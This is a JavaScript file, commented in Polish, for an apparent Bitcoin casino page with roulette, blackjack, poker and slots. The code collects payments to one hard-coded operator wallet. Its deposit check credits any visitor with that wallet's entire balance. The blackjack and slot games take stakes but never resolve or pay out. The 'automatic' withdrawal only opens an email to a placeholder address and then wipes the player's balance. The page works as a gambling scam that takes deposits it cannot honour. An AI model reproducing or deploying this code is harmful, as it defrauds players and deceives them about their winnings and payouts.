// 1. USTAWIENIA I ZMIENNE
const myBTCAddress = "bc1qe25ang24lnk8herylzzhjvdzhkkefxs53ddggd";
let userBalance = 0;

const engine = document.getElementById('game-engine-render');
const modal = document.getElementById('game-window');

// 2. SYSTEM SPRAWDZANIA WPŁAT (AUTOMAT)
async function checkDeposit() {
    const statusText = document.getElementById('status-text');
    if (statusText) statusText.innerText = "ŁĄCZENIE Z BLOCKCHAINEM...";

    try {
        // API sprawdza Twój portfel BTC
        const response = await fetch(`https://blockstream.info/api/address/${myBTCAddress}/utxo`);
        const data = await response.json();

        if (data.length > 0) {
            let totalSatoshi = data.reduce((sum, utxo) => sum + utxo.value, 0);
            userBalance = totalSatoshi / 100000000; // Konwersja na BTC
            alert("ZNALEZIONO ŚRODKI! Twoje saldo: " + userBalance + " BTC");
            updateUI();
        } else {
            alert("Brak nowych wpłat na adresie: " + myBTCAddress);
        }
    } catch (e) {
        alert("Błąd połączenia z siecią Bitcoin.");
    }
}

function updateUI() {
    const balDisplay = document.getElementById('balance-display');
    if (balDisplay) balDisplay.innerText = `SALDO: ${userBalance.toFixed(6)} BTC`;
}

// 3. SYSTEM WYBORU GIER
function openGame(gameType) {
    modal.style.display = "block";
    engine.innerHTML = "<p>Inicjowanie...</p>";

    if (gameType === 'roulette') loadRoulette();
    else if (gameType === 'bj') loadBlackjack();
    else if (gameType === 'poker') loadPoker();
    else if (gameType === 'slot') loadSlots();
}

function closeGame() {
    modal.style.display = "none";
}

// --- GRA: RULETKA ---
function loadRoulette() {
    engine.innerHTML = `
        <div class="casino-machine">
            <h3>RULETKA LIVE 24/7</h3>
            <div id="balance-display" style="color:gold;">SALDO: ${userBalance.toFixed(6)} BTC</div>
            <div id="wheel-display" style="font-size: 60px; margin: 20px;">0</div>
            <div id="status-text">Postaw 0.0001 BTC na kolor</div>
            <button onclick="checkDeposit()" style="margin-bottom:10px;">🔄 SPRAWDŹ WPŁATĘ</button>
            <div style="display: flex; gap: 10px; justify-content: center;">
                <button onclick="playRoulette('RED')" style="background:red; color:white;">CZERWONE</button>
                <button onclick="playRoulette('BLACK')" style="background:black; color:white;">CZARNE</button>
            </div>
        </div>`;
}

function playRoulette(betColor) {
    if (userBalance < 0.0001) {
        alert("Brak środków! Wpłać BTC na adres: " + myBTCAddress);
        return;
    }
    userBalance -= 0.0001;
    updateUI();

    const status = document.getElementById('status-text');
    const display = document.getElementById('wheel-display');
    status.innerText = "Losowanie...";

    let count = 0;
    const anim = setInterval(() => {
        display.innerText = Math.floor(Math.random() * 37);
        count++;
        if (count > 20) {
            clearInterval(anim);
            const result = Math.floor(Math.random() * 37);
            const winColor = result === 0 ? "GREEN" : (result % 2 === 0 ? "RED" : "BLACK");
            display.innerText = result;

            if (betColor === winColor) {
                userBalance += 0.0002;
                status.innerText = "WYGRANA!";
            } else {
                status.innerText = "PRZEGRANA.";
            }
            updateUI();
        }
    }, 50);
}

// --- GRA: BLACKJACK ---
function loadBlackjack() {
    engine.innerHTML = `
        <h3>BLACKJACK 21</h3>
        <div id="balance-display">SALDO: ${userBalance.toFixed(6)} BTC</div>
        <div id="bj-table">Twoje karty: <span id="player-hand">?</span></div>
        <button onclick="startBJ()" class="wallet-btn">GRAJ (0.0002 BTC)</button>
    `;
}

function startBJ() {
    if (userBalance < 0.0002) { alert("Brak BTC!"); return; }
    userBalance -= 0.0002;
    updateUI();
    const pHand = Math.floor(Math.random() * 10) + 12;
    document.getElementById('player-hand').innerText = pHand;
}

// --- GRA: POKER ---
function loadPoker() {
    engine.innerHTML = `
        <h3>POKER TEXAS HOLDEM</h3>
        <p>Wpłać wpisowe, aby dołączyć:</p>
        <button onclick="window.location.href='bitcoin:${myBTCAddress}?amount=0.0005'" class="wallet-btn">OTWÓRZ PORTFEL (0.0005 BTC)</button>
        <button onclick="checkDeposit()" style="margin-top:10px;">POTWIERDŹ WPŁATĘ</button>
    `;
}

// --- GRA: SLOTY ---
function loadSlots() {
    engine.innerHTML = `
        <h3>777 GOLDEN SLOT</h3>
        <div id="balance-display">SALDO: ${userBalance.toFixed(6)} BTC</div>
        <div id="slot-machine" style="font-size: 40px; background: #333; padding: 20px;">[ 🍒 | 🍒 | 🍒 ]</div>
        <button onclick="spinSlots()" class="wallet-btn">SPIN (0.0001 BTC)</button>
    `;
}

function spinSlots() {
    if (userBalance < 0.0001) { alert("Brak BTC!"); return; }
    userBalance -= 0.0001;
    updateUI();
    const icons = ["🍒", "🔔", "💎", "7️⃣", "🍋"];
    const slot = document.getElementById('slot-machine');
    let t = 0;
    const int = setInterval(() => {
        slot.innerText = `[ ${icons[Math.floor(Math.random()*5)]} | ${icons[Math.floor(Math.random()*5)]} | ${icons[Math.floor(Math.random()*5)]} ]`;
        t++;
        if(t > 15) { clearInterval(int); updateUI(); }
    }, 100);
}
// --- SYSTEM WYPŁAT (WITHDRAW) ---
function loadWithdraw() {
    engine.innerHTML = `
        <div class="withdraw-panel">
            <h3>WYPŁATA WYGRANEJ</h3>
            <p>Twoje saldo do wypłaty: <strong>${userBalance.toFixed(6)} BTC</strong></p>
            <input type="text" id="user-btc-address" placeholder="Wklej swój adres BTC" style="width: 80%; padding: 10px; margin-bottom: 10px;">
            <br>
            <button onclick="requestWithdraw()" class="gold-btn" style="background: gold; color: black; font-weight: bold;">
                ZLEĆ WYPŁATĘ (AUTOMAT)
            </button>
            <p id="withdraw-status" style="font-size: 0.8rem; color: #aaa; margin-top: 10px;">
                Wypłaty są procesowane po 1 potwierdzeniu sieci.
            </p>
        </div>
    `;
}

function requestWithdraw() {
    const userAddr = document.getElementById('user-btc-address').value;
    const status = document.getElementById('withdraw-status');

    if (userBalance <= 0) {
        alert("Brak środków do wypłaty!");
        return;
    }

    if (userAddr.length < 25) {
        alert("Podaj poprawny adres BTC!");
        return;
    }

    // SYMULACJA AUTOMATU: Wysyłamy dane o wypłacie do "systemu" (Ciebie)
    status.innerText = "PROCESOWANIE... PROSZĘ CZEKAĆ.";
    
    // Protokół mailowy (otworzy graczowi program pocztowy z gotową instrukcją dla Ciebie)
    // W profesjonalnym systemie tutaj byłby skrypt PHP/Node.js
    const subject = encodeURIComponent("ZLECENIE WYPŁATY - CASINO");
    const body = encodeURIComponent(`Zlecenie wypłaty: ${userBalance} BTC\nNa adres: ${userAddr}`);
    
    window.location.href = `mailto:TWOJ_MAIL@GMAIL.COM?subject=${subject}&body=${body}`;

    alert("Zlecenie zostało wygenerowane! Wyślij wiadomość, aby automat zatwierdził Twój adres.");
    userBalance = 0; // Zerujemy saldo na stronie po zleceniu
    updateUI();
}
